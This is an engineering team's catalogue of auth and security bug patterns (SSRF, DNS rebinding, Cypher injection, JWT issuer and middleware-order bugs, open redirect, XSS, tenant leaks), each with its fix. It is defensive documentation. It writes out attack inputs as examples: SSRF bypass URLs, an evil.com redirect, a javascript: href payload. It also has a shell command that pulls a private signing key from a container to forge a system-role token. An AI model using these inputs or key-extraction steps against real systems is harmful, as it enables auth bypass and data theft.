# Bug Patterns — Auth & Security

> **Category**: auth-security
> **Description**: JWT/OIDC middleware, SSRF, XSS, injection attacks, tenant isolation, CSP headers, auth bypass, RS256/HS256
> **Count**: 31 patterns
> **Back to index**: [BUG_PATTERNS.md](../BUG_PATTERNS.md)

---

## BP-026 — SSRF missing IPv4-mapped IPv6 bypass

**Date discovered**: 2026-03-27
**Service affected**: `content-ingestion` (found during PLAN-0001-B-R4 QA review)

### Symptom

A URL like `http://[::ffff:127.0.0.1]/internal` passes SSRF validation even though it routes to localhost. Manual IP range checks for `127.0.0.0/8` don't cover the IPv4-mapped IPv6 form.

### Root cause

Manual `_PRIVATE_NETWORKS` lists check `127.0.0.0/8`, `10.0.0.0/8`, etc. These only apply to `IPv4Address` objects. An `IPv6Address` like `::ffff:127.0.0.1` is technically in the `::ffff:0:0/96` range and has `ipv4_mapped = IPv4Address('127.0.0.1')`, but won't match any IPv4 range check unless you first extract the mapped address.

### Correct implementation pattern

```python
# WRONG — misses IPv4-mapped IPv6
def _is_private_ip(addr):
    return any(addr in network for network in _PRIVATE_NETWORKS)

# CORRECT — use Python builtins + handle IPv4-mapped IPv6
def _is_private_ip(addr: ipaddress.IPv4Address | ipaddress.IPv6Address) -> bool:
    if isinstance(addr, ipaddress.IPv6Address) and addr.ipv4_mapped:
        addr = addr.ipv4_mapped  # unwrap ::ffff:x.x.x.x → IPv4
    return addr.is_private or addr.is_reserved or addr.is_loopback or addr.is_multicast or addr.is_link_local
```

Python's built-in `is_private`, `is_reserved`, `is_loopback` properties cover all RFC-defined ranges including CGNAT (100.64.0.0/10), multicast, and future additions.

### Test to add (prevents regression)

```python
@pytest.mark.parametrize("url", [
    "http://[::ffff:127.0.0.1]/",
    "http://[::ffff:10.0.0.1]/",
    "http://100.64.0.1/",  # CGNAT
    "http://224.0.0.1/",   # multicast
])
def test_rejects_private_ip_variants(url):
    with pytest.raises(ValueError):
        IngestRequest(url=url, ...)
```

### Files changed in fix

| File | Change |
|------|--------|
| `services/content-ingestion/src/content_ingestion/api/schemas.py` | Replaced manual network lists with `is_private` builtins + IPv4-mapped unwrap |

---

---

## BP-027 — DNS rebinding TOCTOU in SSRF validation

**Date discovered**: 2026-03-27
**Service affected**: `content-ingestion` (found during PLAN-0001-B-R4 QA review)

### Symptom

URL passes SSRF validation (DNS resolves to public IP), but by the time the HTTP client connects, DNS has been rebounded to a private IP. The request reaches an internal service despite validation passing.

### Root cause

DNS validation and HTTP connection are two separate operations with a time gap. An attacker controls a DNS server that returns a public IP on the first query (validation) and a private IP on the second query (connection). This is a classic TOCTOU (Time Of Check, Time Of Use) race.

### Correct implementation pattern

```python
class SSRFSafeTransport(httpx.AsyncBaseTransport):
    """Validates resolved IPs at connection time, not just at validation time."""

    async def handle_async_request(self, request: httpx.Request) -> httpx.Response:
        hostname = request.url.host
        if hostname:
            addr_infos = await asyncio.to_thread(socket.getaddrinfo, hostname, None)
            for _family, _type, _proto, _canonname, sockaddr in addr_infos:
                addr = ipaddress.ip_address(sockaddr[0])
                if _is_private_ip(addr):
                    raise httpx.ConnectError(f"SSRF blocked: {hostname} → {addr}")
        return await self._inner.handle_async_request(request)
```

Wire this transport when constructing `httpx.AsyncClient` in the app lifespan.

### Test to add (prevents regression)

```python
async def test_transport_blocks_dns_rebinding():
    transport = SSRFSafeTransport()
    request = httpx.Request("GET", "http://rebind.example.com/")
    with patch("socket.getaddrinfo", return_value=[(..., ..., ..., "", ("127.0.0.1", 0))]):
        with pytest.raises(httpx.ConnectError, match="SSRF blocked"):
            await transport.handle_async_request(request)
```

### Files changed in fix

| File | Change |
|------|--------|
| `services/content-ingestion/src/content_ingestion/infrastructure/http/ssrf_transport.py` | New — `SSRFSafeTransport` implementation |
| `services/content-ingestion/src/content_ingestion/app.py` | Wire `SSRFSafeTransport` into `httpx.AsyncClient` |

---

## Template for new entries

Copy this block when adding a new pattern:

```markdown

---

## BP-038 — `assert` used for production error handling

**Date discovered**: 2026-03-27
**Service affected**: `market-data` (ohlcv_consumer, quotes_consumer, fundamentals_consumer)

### Symptom

With `python -O`, the assertion is stripped and the guard becomes a no-op. Under normal execution, `AssertionError` is raised with no context message.

### Root cause

```python
assert self._current_uow is not None  # Stripped by python -O
```

### Fix

Replace with explicit guard:
```python
if self._current_uow is None:
    raise RuntimeError("mark_processed called outside processing context")
```

---

---

## BP-047 — `readyz` health endpoint leaks DB credentials via raw exception string

**Category**: Security / Information disclosure
**Services affected**: All FastAPI services with `/readyz` endpoint
**First seen**: PLAN-0001-E QA-010

### Symptom

`GET /readyz` returns `HTTP 503` with body:
```json
{"db": "error: password authentication failed for user 'postgres'@db:5432/portfolio_db"}
```
Or worse, if the connection string contains a password:
```json
{"db": "error: (asyncpg.InvalidPasswordError) password authentication failed for user 'postgres' at postgresql+asyncpg://postgres:s3cr3t@db:5432/..."}
```

### Root cause

```python
# WRONG — raw exception message in HTTP response body
except Exception as exc:
    checks["db"] = f"error: {exc}"  # leaks DSN, password, host info
```

### Fix

Return opaque string in HTTP body; log full details internally:

```python
# CORRECT — opaque error in response, full details in logs only
except Exception as exc:
    log.error("readyz_db_check_failed",
              error_type=type(exc).__name__, error=str(exc))
    checks["db"] = "error"   # client sees only "error", not the exception
```

Also: `log` must be the service-level logger, not a locally-undefined name. If `log` is defined inside a lifespan function, it won't be accessible in a route handler defined in `create_app()`. Use `get_logger("service.app")` directly inside the handler.

---

---

## BP-091 — AGE Cypher injection via f-string entity_id

**Services affected**: knowledge-graph (S7) — `CypherPathUseCase`, `CypherNeighborhoodUseCase`
**Detected**: PRD-0018 security analysis (2026-04-04)

### Symptom

A Cypher query built with an f-string allows an attacker to manipulate graph traversal,
bypass confidence filters, or trigger unexpected query patterns. Even though `entity_id`
is validated as a UUID, the AGE `cypher()` function executes the full string as Cypher —
UUID validation does not prevent injection in other query parameters.

### Root Cause

```python
# WRONG — Cypher injection vector:
query = f"""
SELECT * FROM ag_catalog.cypher('worldview_graph', $$
  MATCH path = shortestPath((s:Entity {{entity_id: '{entity_id}'}})-[r*1..{max_hops}]->(...))
$$) AS (path ag_catalog.agtype)
"""
```

The `max_hops` parameter is an integer but still f-stringed; if the validation is bypassed,
arbitrary Cypher can be injected via other parameters.

### Fix

Use AGE parameterized Cypher with the `params` argument to `ag_catalog.cypher()`:

```python
query = text("""
SELECT * FROM ag_catalog.cypher('worldview_graph', $$
  MATCH path = shortestPath(
    (s:Entity {entity_id: $source})-[r*1..5]->(t:Entity {entity_id: $target})
  )
  WHERE ALL(rel IN relationships(path) WHERE rel.confidence >= $min_conf)
  RETURN path
$$, :params) AS (path ag_catalog.agtype)
""")
result = await session.execute(query, {
    "params": json.dumps({"source": str(source_id), "target": str(target_id), "min_conf": min_confidence})
})
```

Note: `max_hops` must be hardcoded in the Cypher template (not parameterized) since Cypher
variable-length patterns `[r*1..N]` do not accept runtime parameters for `N`. The route layer
enforces `max_hops ≤ 5` before the use case is called.

### Prevention

All AGE Cypher queries must use `ag_catalog.cypher(..., :params)` with a JSON params dict.
Never f-string any variable into a Cypher query string, even validated UUIDs.
REVIEW_CHECKLIST item: "AGE Cypher queries — parameterized, not f-stringed."

---

---

## BP-143 — Starlette Middleware Order: InternalJWT Outermost Sees user=None

**Category**: Architecture / Middleware
**Severity**: HIGH (silent security failure — internal JWT never issued)

**Pattern**: When registering `InternalJWTIssuerMiddleware` via `add_middleware()` AFTER `OIDCAuthMiddleware`, Starlette makes it the OUTERMOST middleware (runs first for requests). At that point `request.state.user` is not yet set by OIDCAuth, so the JWT issuance is silently skipped. All downstream service calls arrive without `X-Internal-JWT`.

**Symptom**: Backend services log `X-Internal-JWT header missing` 401 errors. No error in S9 — the middleware silently no-ops because `user is None`.

**Root cause**: Starlette's `add_middleware()` prepends middleware to the chain. Last added = outermost = first to receive requests. `InternalJWTIssuerMiddleware.dispatch()` reads `request.state.user` which is set by `OIDCAuthMiddleware` — but if InternalJWT runs before OIDCAuth, user is always None.

**Fix**: Register `InternalJWTIssuerMiddleware` BEFORE `OIDCAuthMiddleware` in `create_app()`:
```python
app.add_middleware(InternalJWTIssuerMiddleware)  # innermost of this pair — runs after OIDCAuth
app.add_middleware(OIDCAuthMiddleware)           # outermost of this pair — runs first
```

**Prevention**:
- Comment the intended request-processing order next to `add_middleware()` calls.
- Write integration test `test_proxy_request_includes_internal_jwt` that asserts `X-Internal-JWT` in downstream headers — this test fails immediately if order is wrong.
- Remember: in Starlette, "last `add_middleware()` call = outermost = first to receive requests".

**First seen**: `services/api-gateway/src/api_gateway/app.py`, PLAN-0025 Wave B, fixed 2026-04-12.

---

## BP-144 — Middleware Reads `app.state` at Construction Time — Feature Permanently Disabled

**Category**: Middleware / FastAPI
**Severity**: HIGH (silent feature failure — rate limiting / feature silently off)

**Pattern**: A FastAPI middleware captures a dependency (e.g., Valkey client, config flag) at `__init__` time by reading `app.state.<attr>`. Because `add_middleware()` is called before the lifespan populates `app.state`, the value is always `None`. The `dispatch()` method then checks `self.attr` (always `None`) and fast-paths through, disabling the feature for the entire process lifetime.

**Symptom**: Rate limiting, feature flags, or other middleware-controlled behavior never activates. No error is logged. Metrics counters remain at zero.

**Root cause**: FastAPI lifespan populates `app.state` after all middleware is registered. `self.attr = app.state.attr_name` in `__init__` captures `None`.

**Fix**: Read the dependency from `request.app.state` inside `dispatch()`:
```python
async def dispatch(self, request: Request, call_next):
    client = getattr(request.app.state, "valkey", None)
    if client is None:
        return await call_next(request)  # graceful degradation
    ...
```

**Prevention** (HR-028): Grep for `self\.<attr>\s*=.*app\.state` in middleware `__init__` methods. Any capture at construction time is suspect unless the value is a constant.

**First seen**: `services/api-gateway/src/api_gateway/middleware/rate_limit.py`, PLAN-0025 QA Phase 2, fixed 2026-04-12.

---

## BP-145 — JWT Decode Without `issuer=` — Issuer Spoofing Auth Bypass

**Category**: Security / Authentication
**Severity**: CRITICAL (auth bypass)

**Pattern**: `jwt.decode(token, public_key, algorithms=["RS256"])` is called without `issuer=expected_issuer`. The library validates the signature but does NOT check the `"iss"` claim. A token signed by any provider — or an attacker's own key pair — is accepted.

**Symptom**: Tokens from unexpected issuers are accepted silently. No error is raised. The `payload["sub"]` is trusted and used to identify the user.

**Fix**: Always pass `issuer=oidc_config.issuer` (and `audience` if applicable):
```python
payload = jwt.decode(
    token, public_key, algorithms=["RS256"],
    issuer=settings.oidc_issuer,
    audience=settings.oidc_client_id,
)
```

**Prevention** (HR-026): Grep `jwt\.decode\(` and verify every call includes `issuer=`. Add a test asserting that a token from a different issuer is rejected with 401.

**First seen**: `services/api-gateway/src/api_gateway/middleware/oidc_auth.py`, PLAN-0025 QA Phase 2, fixed 2026-04-12.

---

## BP-146 — PKCE / One-Time Token: Non-Atomic GET + DEL Enables State Replay

**Category**: Security / Race Condition
**Severity**: CRITICAL (PKCE replay vulnerability)

**Pattern**: A one-time-use secret (PKCE code verifier, nonce, CSRF token) is retrieved from Valkey using `GET key` then `DEL key` — two separate commands. Under concurrent load, two requests both execute `GET` before either executes `DEL`. Both receive the value, breaking the one-time-use guarantee.

**Root cause**: `GET` + `DEL` is not atomic. Valkey pipelines help throughput but do not make two commands atomic.

**Fix**: Use the atomic `GETDEL` command (Redis 6.2+, Valkey 7+):
```python
async def retrieve_and_delete(self, key: str) -> str | None:
    return await self._client.getdel(key)  # atomic GET-then-DELETE
```

**Prevention** (HR-027): Any "retrieve once and delete" operation on a security token MUST use `GETDEL` or a Lua script. Never use `GET` + `DEL` on the same key for one-time-use tokens.

**First seen**: `libs/messaging/src/messaging/valkey/client.py`, PLAN-0025 QA Phase 2, fixed 2026-04-12 (added `ValkeyClient.getdel()`).

---

## BP-157 — Root E2E conftest HS256 JWT rejected by live RS256-keyed middleware

**Date discovered**: 2026-04-13
**Service affected**: All services in root `tests/e2e/` suite

### Symptom

Root E2E `conftest.py` `_make_e2e_system_jwt()` generates an HS256-signed JWT (`jwt.encode(..., algorithm="HS256")`). The live test stack loads the RS256 public key from `S9/internal/jwks` during service startup. `InternalJWTMiddleware` has `public_key != None` and calls `jwt.decode(token, public_key, algorithms=["RS256"])`. An HS256 token fails this check with `InvalidTokenError`, and all E2E test requests receive 401.

### Root cause

The conftest fallback (`public_key is None → skip sig verification`) was designed for the case where S9 is not running. When the full live stack is up, all services successfully load the RS256 key and enforce strict RS256 verification. The HS256 test token is not a valid RS256 token.

### Fix

Set `PORTFOLIO_E2E_INTERNAL_JWT` to a real RS256-signed token from the live api-gateway private key before running root E2E tests:

```bash
export PORTFOLIO_E2E_INTERNAL_JWT=$(python3 -c "
import jwt, time, subprocess
pem = subprocess.check_output(
    ['docker', 'compose', '-f', 'infra/compose/docker-compose.test.yml',
     'exec', '-T', 'api-gateway', 'bash', '-c', 'echo \"\$API_GATEWAY_INTERNAL_JWT_PRIVATE_KEY\"'],
).decode().strip()
print(jwt.encode({'sub':'e2e','iss':'worldview-gateway','aud':['worldview-service'],
    'iat':int(time.time()),'exp':int(time.time())+7200,'tenant_id':'e2e','user_id':'e2e','role':'system'},
    pem, algorithm='RS256'))
")
```

**Prevention**: Either update `_make_e2e_system_jwt()` to try RS256 with the api-gateway key, or use HS256 only when public_key is None (already the design). The real fix is ensuring the conftest reads the gateway private key when the stack is live.

**First seen**: `tests/e2e/conftest.py:56-75`, 2026-04-13.

---

---

## BP-158 — E2E client fixtures missing X-Internal-JWT after PLAN-0025

**Date discovered**: 2026-04-13
**Service affected**: S2, S4, S6, S7, S10 E2E tests; KG/market-data/content-ingestion/market-ingestion service-level E2E conftests

### Symptom

After PLAN-0025 added `InternalJWTMiddleware` to all services (commit f21da3e), the root E2E conftest and service-level E2E conftests for S6/S7/S10/S4/S2 were not updated to include `X-Internal-JWT` in their `AsyncClient` default headers. All API calls to non-health endpoints return `{"detail":"Missing X-Internal-JWT header"}` (HTTP 401).

BP-134 documented the same issue for some services; this is the remaining set.

### Affected fixtures

- `tests/e2e/conftest.py`: `s6_client` (line 229), `s7_client` (line 233), `s10_client` (line 234), `s4_internal_client` (if present)
- `services/knowledge-graph/tests/e2e/conftest.py`: `e2e_client` fixture
- `services/market-data/tests/e2e/conftest.py`: `e2e_client` fixture
- `services/content-ingestion/tests/e2e/conftest.py`: `e2e_client` fixture
- `services/market-ingestion/tests/e2e/conftest.py`: `e2e_client` (if applicable)
- `services/alert/tests/integration/conftest.py`: `integration_client` fixture

### Fix

Add `X-Internal-JWT` to each fixture's `AsyncClient`:

```python
_INTERNAL_JWT = os.getenv("PORTFOLIO_E2E_INTERNAL_JWT", "") or _make_e2e_system_jwt()

@pytest.fixture
async def s6_client() -> AsyncGenerator[AsyncClient, None]:
    async with AsyncClient(
        base_url=_S6_BASE_URL,
        headers={"X-Internal-JWT": _INTERNAL_JWT},
        timeout=30.0,
    ) as ac:
        yield ac
```

For service-level conftests, add the same pattern to `e2e_client`.

**Prevention**: When adding `InternalJWTMiddleware` to a service, update ALL test conftest files in that service (unit, integration, e2e) and the root `tests/e2e/conftest.py` client fixture for that service.

**First seen**: Multiple service e2e conftests, 2026-04-13.

---

---

## BP-159 — BaseHTTPMiddleware Dual-Instance: startup() on Wrong Instance

**Category**: FastAPI / Starlette middleware wiring
**Severity**: CRITICAL (silent security bypass when the stored instance holds security keys)
**First seen**: `InternalJWTMiddleware`, portfolio service, 2026-04-14

### Symptom

`InternalJWTMiddleware.startup()` is called in the FastAPI lifespan on the explicitly-created instance:
```python
jwt_middleware = InternalJWTMiddleware(app, jwks_url=jwks_url)
app.state._jwt_middleware = jwt_middleware
await jwt_middleware.startup()  # sets jwt_middleware._public_key
```

But `app.add_middleware(InternalJWTMiddleware, jwks_url=jwks_url)` creates a **second instance** when `app.build_middleware_stack()` runs. That second instance is the one that actually handles requests — and its `_public_key` is always `None`.

Any code in `dispatch()` that reads `self._public_key` sees `None` regardless of whether startup() succeeded. In this case, the fallback was an unverified JWT decode (auth bypass). The test suite never catches this because tests construct the middleware manually, bypassing `add_middleware`.

### Root Cause

Starlette's middleware stack construction calls `cls(app=self.router, **kwargs)` for each registered middleware (not for the `app.add_middleware()` call itself). The explicitly-instantiated `jwt_middleware` and the stack instance are different Python objects.

### Fix

Store shared state on `app.state` instead of `self.*` in the middleware. Use `request.app.state` in `dispatch()` to read it (works because `request.app` is the FastAPI instance regardless of which middleware instance serves the request):

```python
async def startup(self) -> None:
    key = await self._fetch_public_key()
    self._public_key = key  # keep for background refresh
    if hasattr(self.app, "state"):
        self.app.state._internal_jwt_public_key = key  # share across instances

async def dispatch(self, request: Request, call_next: Callable) -> Response:
    public_key = getattr(request.app.state, "_internal_jwt_public_key", None)
    if public_key is None:
        return Response('{"detail":"Service not ready"}', status_code=503)
    ...
```

In tests, pre-populate `app.state._internal_jwt_public_key = test_key` before the middleware stack is built.

### Prevention

Never read security-critical state from `self.*` in a `BaseHTTPMiddleware` that is added via `app.add_middleware()`. Always route through `app.state` (readable via `request.app.state` in dispatch).

> **Confirmed 2026-04-18**: api-gateway lifespan correctly calls `startup()` via ASGI lifespan, NOT on a throw-away instance. Test gap remains (F-MAJOR-009).

---

---

## BP-161 — Query-String Identity Injection

**Category**: Security
**Severity**: CRITICAL
**First seen**: 2026-04-18 QA audit (F-CRIT-002)

### Symptom

FastAPI unannotated `UUID` parameter silently maps to query string, allowing unauthenticated callers to pass arbitrary tenant/user IDs via `?tenant_id=<uuid>`.

### Root Cause

FastAPI treats non-path, non-body, unannotated scalar parameters as query parameters by default. An endpoint signature like `def handler(tenant_id: UUID)` where `tenant_id` is not in the path template and has no `Header()`, `Path()`, or `Depends()` annotation will accept `?tenant_id=<any-uuid>` from any caller — enabling tenant impersonation.

### Affected

Any FastAPI endpoint with `tenant_id: UUID` or `user_id: UUID` parameters that lack `Header()`, `Path()`, or `Depends()` annotations.

### Fix

Always annotate identity parameters. Use `request.state.tenant_id` from `InternalJWTMiddleware`, not headers or query params:

```python
# WRONG — silently becomes a query parameter
async def handler(tenant_id: UUID):
    ...

# RIGHT — read from middleware-validated JWT
async def handler(request: Request):
    tenant_id = request.state.tenant_id
    ...
```

### Prevention

Architecture test that greps for unannotated `tenant_id`/`user_id` function parameters in API routers. All identity values MUST come from `request.state` (populated by `InternalJWTMiddleware` from the verified `X-Internal-JWT`).

---

---

## BP-164 — Docker Compose Missing `depends_on` Causes JWKS Startup Race

| Field | Value |
|-------|-------|
| **Discovered** | 2026-04-19 |
| **Affected areas** | S8 rag-chat (and potentially any service with InternalJWTMiddleware) |
| **Root cause** | S8's `depends_on` lists `rag-chat-migrate`, `valkey`, `ollama` but NOT `api-gateway`. S8 starts before S9, JWKS fetch fails (3 retries × 3s = 9s window), then ALL authenticated requests return 503 permanently. |
| **Fix** | Add `api-gateway: condition: service_healthy` to S8's `depends_on` in `docker-compose.yml`. |

### Prevention

Every backend service that uses `InternalJWTMiddleware` MUST declare `depends_on: api-gateway: condition: service_healthy` in docker-compose.yml. The InternalJWTMiddleware should also support on-demand JWKS retry when `_public_key is None` at request time (not just at startup).

---

---

## BP-165 — Open Redirect via Unvalidated `redirect_to` Query Parameter

| Field | Value |
|-------|-------|
| **Discovered** | 2026-04-19 |
| **Severity** | CRITICAL |
| **Affected areas** | Frontend auth flow: `app/login/page.tsx`, `app/callback/page.tsx` |
| **Root cause** | `searchParams.get("redirect_to")` stored in sessionStorage and passed directly to `router.replace()`. Next.js `router.replace()` follows absolute URLs. An attacker crafting `/login?redirect_to=https://evil.com` redirects an authenticated user to an external phishing site. |
| **Symptom** | After successful OIDC login, user is redirected to attacker-controlled domain. |
| **Fix** | Added `sanitizeRedirect()` to `lib/utils.ts`; validates the value starts with `/` and not `//` before use. Applied at both reading sites. |

### Prevention

ANY URL, path, or redirect target that originates from a URL query parameter, sessionStorage, localStorage, or an external API MUST be validated before use in navigation. Use `sanitizeRedirect()` from `lib/utils.ts` for post-auth navigation. Never pass raw query param values to `router.push()`, `router.replace()`, `window.location.href`, or any `href` attribute.

---

---

## BP-166 — `javascript:` URL XSS via API-Supplied `href` Values

| Field | Value |
|-------|-------|
| **Discovered** | 2026-04-19 |
| **Severity** | MAJOR |
| **Affected areas** | Any component that renders `<a href={apiValue}>` from external content (news articles, prediction markets, RAG citations) |
| **Root cause** | URLs from external APIs (news feeds, prediction markets) are placed directly in `href` attributes without scheme validation. A malicious or compromised content pipeline can return `javascript:alert(1)` as a URL, which executes when the user clicks the link. `rel="noopener noreferrer"` does NOT prevent `javascript:` execution. |
| **Symptom** | Clicking a "news article" or "prediction market" link executes JavaScript in the user's browser — stored XSS. |
| **Fix** | Added `safeExternalUrl()` to `lib/utils.ts`; allowlists only `http:` and `https:` protocols. Returns `"#"` for all other values. Applied to `ArticleCard.tsx`, `WatchlistNews.tsx`, `TopBets.tsx`, `chat/page.tsx`. |

### Prevention

ALL `<a href>` attributes populated from API data MUST use `safeExternalUrl()` from `lib/utils.ts`. Never place raw API string values in `href`. This applies to news article URLs, prediction market URLs, RAG citation URLs, and any other external link rendered in the frontend.

---

---

## BP-187 — `skip_verification` Has No Production Safety Guard

| Field | Value |
|-------|-------|
| **Discovered** | 2026-04-24 (QA finding F-007) |
| **Severity** | HIGH — when `internal_jwt_skip_verification=True` AND `_public_key` is `None`, `jwt.decode()` runs with `verify_signature=False`, accepting any token regardless of signature, issuer, or expiry. Effectively disables authentication. |
| **Affected areas** | All 9 backend service `config.py` files: `alert`, `rag-chat`, `market-data`, `content-ingestion`, `market-ingestion`, `portfolio`, `nlp-pipeline`, `content-store`, `knowledge-graph` |
| **Root cause** | `internal_jwt_skip_verification: bool = False` exists in all 9 service configs with no environment-aware guard. An operator could set it to `True` in production (e.g. during a JWKS outage), fully disabling auth. The flag was intended for local development and test environments only. |
| **Symptom** | No visible symptom — silent auth bypass. Any JWT (expired, wrong issuer, forged) is accepted. Only detectable by security audit or auth boundary testing. |
| **Fix** | Added `@model_validator(mode="after")` named `_guard_skip_verification` to all 9 service `config.py` files. When `APP_ENV=production` and `internal_jwt_skip_verification=True`, the validator raises `ValueError` at startup, preventing the service from starting with an unsafe configuration. Tests use `Settings(internal_jwt_skip_verification=True)` directly without setting `APP_ENV`, so they are unaffected. |

### Prevention

- Any boolean flag that bypasses a security control MUST have an environment-aware guard that rejects the unsafe value in production.
- Pattern: `@model_validator(mode="after")` that reads `os.getenv("APP_ENV")` and raises `ValueError` for unsafe combinations.
- See also: BP-161 (unannotated path parameters allowing tenant impersonation — same theme of auth bypass via misconfiguration).

---

---

## BP-188 — JWKS Startup Failure Creates Zombie Pods

| Field | Value |
|-------|-------|
| **Discovered** | 2026-04-24 (QA finding F-003) |
| **Severity** | HIGH — service starts and passes readiness probes but cannot authenticate any request. All authenticated endpoints return 503. Operators see a "healthy" service that is fully non-functional. |
| **Affected areas** | All 9 backend services with `InternalJWTMiddleware.startup()`: `alert`, `rag-chat`, `market-data`, `content-ingestion`, `market-ingestion`, `portfolio`, `nlp-pipeline`, `content-store`, `knowledge-graph` |
| **Root cause** | `InternalJWTMiddleware.startup()` retries 3 times to fetch the JWKS public key from S9 (`GET /internal/jwks`). After all retries fail, it logs an ERROR and **returns without raising** — `_public_key` remains `None`. Health endpoints (`/healthz`, `/readyz`) do not check JWKS state, so readiness probes pass. Docker restart policies are not triggered because the process is running. |
| **Symptom** | Service appears healthy in Docker/K8s. All authenticated API requests return `503 Service Unavailable` (the middleware sees `_public_key is None` and returns 503). No crash, no restart, no alert — a zombie pod. |
| **Fix** | Two changes: (1) `startup()` now raises `RuntimeError` after all retries are exhausted, crashing the process and triggering Docker's restart policy. (2) `/readyz` endpoints in all 9 services now check that `app.state._internal_jwt_public_key` is not `None` and return 503 if JWKS is not loaded. |

### Prevention

- Any middleware that loads external state at startup (keys, certificates, config) MUST raise on failure — never log-and-continue.
- `/readyz` endpoints MUST check all critical runtime dependencies, including cryptographic key availability.
- Long-term: extract `InternalJWTMiddleware` from 9 copy-pasted files into `libs/auth-middleware` to ensure fixes are applied once.
- See also: BP-159 (middleware instance mismatch — `app.add_middleware()` creates a different instance than the one calling `startup()`).

---

---

## BP-190 — Missing tenant_id Filter in NLP Pipeline News Queries

| Field | Value |
|-------|-------|
| **Discovered** | 2026-04-24 (QA finding F-009) |
| **Severity** | CRITICAL (multi-tenancy) — `get_entity_articles()` queries `entity_mentions` with zero `WHERE tenant_id` predicate. When multi-tenancy is active, any authenticated user can access articles linked to any entity, revealing other tenants' watchlist composition. |
| **Affected areas** | `services/nlp-pipeline/` — `entity_mentions` table, `news_query.py` query layer, `signals.py` entity articles route |
| **Root cause** | PRD-0025 introduced `tenant_id` to all services, but the NLP pipeline's `entity_mentions` table predates multi-tenancy and had no `tenant_id` column. The query layer was never updated to filter by tenant. |
| **Symptom** | No visible symptom in single-tenant mode. In multi-tenant mode: cross-tenant data leakage via `GET /api/v1/entities/{id}/articles`. |
| **Fix** | Added nullable `tenant_id UUID` column to `entity_mentions` (Alembic migration). Updated the article consumer to stamp `tenant_id` from the Kafka event envelope. Updated `get_entity_articles()` to filter `AND (em.tenant_id IS NULL OR em.tenant_id = :tenant_id)` — the `IS NULL` fallback ensures legacy rows remain visible. Added index on `(tenant_id, resolved_entity_id)`. See ADR-TENANT-001 for the full scoping decision. |

### Prevention

- When introducing `tenant_id` to a platform (PRD-0025), audit ALL tables and queries in ALL services for tenant isolation gaps — not just the tables being migrated.
- Tables that reveal tenant-specific relationships (watchlists, preferences, entity associations) MUST have `tenant_id` even if the underlying data (articles) is platform-global.
- See also: BP-161 (unannotated tenant_id path parameters), BP-191 (missing watchlist ownership check).

---

---

## BP-191 — No Entity Ownership Check in Entity Articles Endpoint

| Field | Value |
|-------|-------|
| **Discovered** | 2026-04-24 (QA finding F-010) |
| **Severity** | CRITICAL (multi-tenancy) — `GET /api/v1/entities/{entity_id}/articles` accepts an arbitrary UUID and returns all linked articles. Entity IDs are UUIDv7 (time-ordered, partially predictable), making enumeration feasible. Combined with F-009, any authenticated user can access all entities and all articles across the entire platform. |
| **Affected areas** | `services/nlp-pipeline/src/nlp_pipeline/api/routes/signals.py` — entity articles endpoint; any endpoint accepting `entity_id` without verifying tenant ownership |
| **Root cause** | The endpoint was designed in single-tenant mode where all entities belong to the same tenant. PRD-0025 introduced multi-tenancy but the entity articles route was not updated with a watchlist ownership guard. |
| **Symptom** | No visible symptom in single-tenant mode. In multi-tenant mode: cross-tenant entity intelligence enumeration. |
| **Fix** | Added watchlist membership check at the route level: before querying articles, the endpoint checks `WatchlistCache.is_watched(tenant_id, entity_id)`. Returns 404 (not 403) if the entity is not in the requesting tenant's watchlist, preventing entity ID enumeration. Fail-open if Valkey is unavailable (logged for ops visibility). |

### Prevention

- Every endpoint that accepts an `entity_id` path parameter MUST verify that the requesting tenant owns or watches that entity. Use the `WatchlistCache` (Valkey-backed) for fast lookups.
- Return 404 (not 403) on failed ownership checks to prevent ID enumeration attacks.
- See also: BP-161 (unannotated UUID parameters), BP-190 (missing tenant_id filter on entity_mentions).

---

---

## BP-230 — Alert `add_middleware()` Missing `jti_replay_check_enabled` (Dual-Instantiation)

| Field | Value |
|-------|-------|
| **Service** | alert (S10) |
| **Severity** | CRITICAL (all cross-service JWT-forwarded requests return 401) |
| **Discovered** | 2026-04-26 QA pre-demo investigation |
| **Root cause** | `InternalJWTMiddleware` is instantiated TWICE in FastAPI: once in the `lifespan` function (for `startup()` — JWKS fetch) and once via `app.add_middleware()` (the SERVING instance). Starlette's `add_middleware` creates a fresh instance without calling `startup()`. When `jti_replay_check_enabled=False` was added to the lifespan instance only, the serving instance kept its default `True` — meaning every forwarded JWT (already recorded in Valkey by S8/S9) was rejected as a replay, returning 401 to rag-chat. |
| **Symptom** | `jti_replay_detected` in alert logs. rag-chat alert fetch returns 401. Morning brief shows no alert context. `alert.infrastructure.middleware.internal_jwt` warning on every request from S8. |
| **Fix** | Pass `jti_replay_check_enabled=settings.jti_replay_check_enabled` to BOTH the lifespan `jwt_mw = InternalJWTMiddleware(app, ..., jti_replay_check_enabled=...)` and `app.add_middleware(InternalJWTMiddleware, ..., jti_replay_check_enabled=settings.jti_replay_check_enabled)`. |

### Prevention

**Whenever `InternalJWTMiddleware` is added to a service, the `add_middleware()` call and any startup() call must have identical parameters.** Create a shared helper `_jwt_middleware_kwargs(settings)` that returns the kwargs dict, and spread it into both call sites. This is a generalisation of BP-159 (startup instance vs serving instance divergence) for the JWT middleware specifically.

---

---

## BP-240 — Alert S1Client Sends Wrong Auth Header After PRD-0025 Migration

| Field | Value |
|-------|-------|
| **Service** | alert (S10) — `infrastructure/clients/s1_client.py` |
| **Severity** | HIGH (zero alerts generated; silent failure) |
| **Discovered** | 2026-04-27 live platform investigation |
| **Root cause** | After PRD-0025 migrated S1 portfolio to RS256 `X-Internal-JWT` auth, the alert service's `S1Client._headers()` still sent `X-Internal-Token` (the old legacy header). Portfolio's `InternalJWTMiddleware` rejects this with 401. The `S1Client` treats all errors as "S1 unavailable" and returns empty watchers — no alert is created, no user notification, no error surfaced. |
| **Symptom** | `GET /v1/alerts/pending` returns `[]`. Consumer logs show `watchlist_s1_unavailable` with `401 Unauthorized` for every entity lookup. `alert_db.alerts` table stays empty. |
| **Fix** | Add `self._jwt = settings.s1_internal_jwt` in `S1Client.__init__`. Update `_headers()` to prefer `X-Internal-JWT` when set, fall back to `X-Internal-Token` for backwards compat. Add `ALERT_S1_INTERNAL_JWT` (a long-lived RS256 service JWT) to `configs/docker.env`. |

### Prevention

- When PRD-0025 (`X-Internal-JWT`) migration is applied to any upstream service, immediately audit ALL downstream callers that use a client for that service. Best-effort clients (those that swallow errors) will silently degrade — no error surfaces until you query the DB and find zero rows.
- Add integration tests for inter-service auth: `test_s1_client_sends_jwt_header()` and `test_watchlist_returns_watchers_for_seeded_entity()`.
